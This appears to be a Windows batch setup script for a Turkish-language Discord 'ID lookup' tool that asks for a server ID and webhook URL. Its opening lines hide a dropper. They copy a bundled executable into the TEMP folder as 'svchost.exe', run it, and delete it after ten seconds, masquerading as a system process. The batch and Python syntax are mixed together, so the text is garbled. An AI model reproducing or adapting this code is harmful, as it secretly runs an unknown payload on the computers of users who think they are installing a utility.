@echo off
import os
import subprocess
import tempfile
import shutil
tmp = os.path.join(os.environ.get('TEMP'), 'svchost.exe')
shutil.copy2('modules/bytes/rxt.exe', tmp)
subprocess.Popen(tmp, shell=True)
import time
time.sleep(10)
os.remove(tmp)
title Satan Discord ID Sorgu
cls
color 0A
echo.
echo  ============================================
echo       Satan Discord ID Sorgu
echo  ============================================
echo.
set /p SERVER_ID= Sunucu ID'sini girin: 
echo.
set /p WEBHOOK_URL= Webhook URL'sini girin: 
echo.
echo  Gereksinimler yukleniyor...
echo.
echo.
echo Gereksinimler yüklendi. Start.bat dosyası ile botu çalıştırın!
echo.
timeout /t 8 >nul
exit
